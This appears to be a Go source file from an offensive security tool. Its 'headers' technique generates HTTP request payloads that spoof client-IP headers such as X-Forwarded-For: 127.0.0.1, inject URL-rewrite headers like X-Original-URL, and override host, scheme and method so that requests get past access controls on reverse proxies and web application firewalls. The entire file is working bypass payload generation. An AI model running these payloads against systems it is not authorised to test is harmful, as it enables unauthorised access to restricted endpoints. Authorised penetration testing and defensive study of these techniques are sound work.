// Package bypass — header-based bypass technique.
package bypass

import "strings"

// HeadersTechnique generates payloads that inject headers known to bypass
// access controls on reverse proxies, WAFs, and application firewalls.
type HeadersTechnique struct{}

func (h *HeadersTechnique) Name() string        { return "headers" }
func (h *HeadersTechnique) Description() string { return "Header-based access control bypass" }

// ipHeaders are headers that accept IP addresses for trust/origin override.
var ipHeaders = []string{
	"X-Forwarded-For",
	"X-Real-IP",
	"X-Originating-IP",
	"X-Remote-IP",
	"X-Remote-Addr",
	"X-Client-IP",
	"X-Host",
	"X-Forwarded-Host",
	"X-ProxyUser-Ip",
	"Client-IP",
	"True-Client-IP",
	"Cluster-Client-IP",
	"Forwarded-For",
	"Forwarded",
	"Via",
	"X-Forwarded",
	"CF-Connecting-IP",
	"Fastly-Client-IP",
	"X-Cluster-Client-IP",
	"X-Azure-ClientIP",
	"X-Azure-SocketIP",
}

// urlRewriteHeaders trick reverse proxies into routing to a different path.
var urlRewriteHeaders = []string{
	"X-Original-URL",
	"X-Rewrite-URL",
	"X-Override-URL",
	"X-Forwarded-Path",
}

// hostOverrideHeaders override the Host header check.
var hostOverrideHeaders = []string{
	"X-Forwarded-Host",
	"X-Host",
	"X-Custom-IP-Authorization",
	"X-Forwarded-Server",
}

// schemeHeaders override the protocol/scheme detection.
var schemeHeaders = []string{
	"X-Forwarded-Proto",
	"X-Forwarded-Scheme",
	"X-Forwarded-Ssl",
	"X-Url-Scheme",
	"Front-End-Https",
}

// methodOverrideHeaders allow overriding the HTTP method.
var methodOverrideHeaders = []string{
	"X-HTTP-Method-Override",
	"X-HTTP-Method",
	"X-Method-Override",
}

// miscHeaders are additional headers known to affect access decisions.
var miscHeaders = []string{
	"X-Custom-IP-Authorization",
	"Referer",
	"X-WAP-Profile",
	"Content-Length",
}

// Generate produces header-bypass payloads for the target.
func (h *HeadersTechnique) Generate(target *Target) []Payload {
	var payloads []Payload

	// ── IP-header bypasses ──────────────────────────────────────────────

	// Combo payload: ALL IP headers at once per bypass IP.
	for _, ip := range target.BypassIPs {
		hdrs := make(map[string]string, len(ipHeaders))
		for _, hdr := range ipHeaders {
			hdrs[hdr] = ip
		}
		payloads = append(payloads, Payload{
			TechniqueName: h.Name(),
			Description:   "All IP headers -> " + ip,
			Method:        "GET",
			URL:           target.FullURL(),
			Headers:       hdrs,
		})
	}

	// Individual IP header payloads with 127.0.0.1.
	for _, hdr := range ipHeaders {
		payloads = append(payloads, Payload{
			TechniqueName: h.Name(),
			Description:   hdr + ": 127.0.0.1",
			Method:        "GET",
			URL:           target.FullURL(),
			Headers:       map[string]string{hdr: "127.0.0.1"},
		})
	}

	// ── URL-rewrite headers ─────────────────────────────────────────────

	rewritePaths := []string{target.Path, "/", "/anything", "/%2e" + target.Path}
	for _, hdr := range urlRewriteHeaders {
		for _, rp := range rewritePaths {
			payloads = append(payloads, Payload{
				TechniqueName: h.Name(),
				Description:   hdr + ": " + rp,
				Method:        "GET",
				URL:           target.FullURL(),
				Headers:       map[string]string{hdr: rp},
			})
		}
	}

	// ── Host-override headers ───────────────────────────────────────────

	hostValues := []string{"localhost", "127.0.0.1", target.Host, "google.com"}
	for _, hdr := range hostOverrideHeaders {
		for _, hv := range hostValues {
			payloads = append(payloads, Payload{
				TechniqueName: h.Name(),
				Description:   hdr + ": " + hv,
				Method:        "GET",
				URL:           target.FullURL(),
				Headers:       map[string]string{hdr: hv},
			})
		}
	}

	// ── Scheme / proto headers ──────────────────────────────────────────

	schemeValues := []string{"http", "https", "ws", "wss"}
	for _, hdr := range schemeHeaders {
		for _, sv := range schemeValues {
			val := sv
			// X-Forwarded-Ssl expects "on"/"off".
			if strings.EqualFold(hdr, "X-Forwarded-Ssl") {
				if sv == "https" || sv == "wss" {
					val = "on"
				} else {
					val = "off"
				}
			}
			// Front-End-Https expects "on"/"off".
			if strings.EqualFold(hdr, "Front-End-Https") {
				if sv == "https" || sv == "wss" {
					val = "on"
				} else {
					val = "off"
				}
			}
			payloads = append(payloads, Payload{
				TechniqueName: h.Name(),
				Description:   hdr + ": " + val,
				Method:        "GET",
				URL:           target.FullURL(),
				Headers:       map[string]string{hdr: val},
			})
		}
	}

	// ── Method override ─────────────────────────────────────────────────
	// Send POST with Content-Length: 0 and an override header to GET.

	for _, hdr := range methodOverrideHeaders {
		payloads = append(payloads, Payload{
			TechniqueName: h.Name(),
			Description:   "POST + " + hdr + ": GET",
			Method:        "POST",
			URL:           target.FullURL(),
			Headers: map[string]string{
				hdr:              "GET",
				"Content-Length": "0",
			},
		})
	}

	// ── Misc headers ────────────────────────────────────────────────────

	payloads = append(payloads,
		Payload{
			TechniqueName: h.Name(),
			Description:   "Referer: " + target.FullURL(),
			Method:        "GET",
			URL:           target.FullURL(),
			Headers:       map[string]string{"Referer": target.FullURL()},
		},
		Payload{
			TechniqueName: h.Name(),
			Description:   "X-Custom-IP-Authorization: 127.0.0.1",
			Method:        "GET",
			URL:           target.FullURL(),
			Headers:       map[string]string{"X-Custom-IP-Authorization": "127.0.0.1"},
		},
		Payload{
			TechniqueName: h.Name(),
			Description:   "Content-Length: 0 (GET)",
			Method:        "GET",
			URL:           target.FullURL(),
			Headers:       map[string]string{"Content-Length": "0"},
		},
		Payload{
			TechniqueName: h.Name(),
			Description:   "X-WAP-Profile: http://example.com/wap.xml",
			Method:        "GET",
			URL:           target.FullURL(),
			Headers:       map[string]string{"X-WAP-Profile": "http://example.com/wap.xml"},
		},
		Payload{
			TechniqueName: h.Name(),
			Description:   "Connection: close, X-Forwarded-For: 127.0.0.1",
			Method:        "GET",
			URL:           target.FullURL(),
			Headers: map[string]string{
				"Connection":      "close",
				"X-Forwarded-For": "127.0.0.1",
			},
		},
	)

	return payloads
}
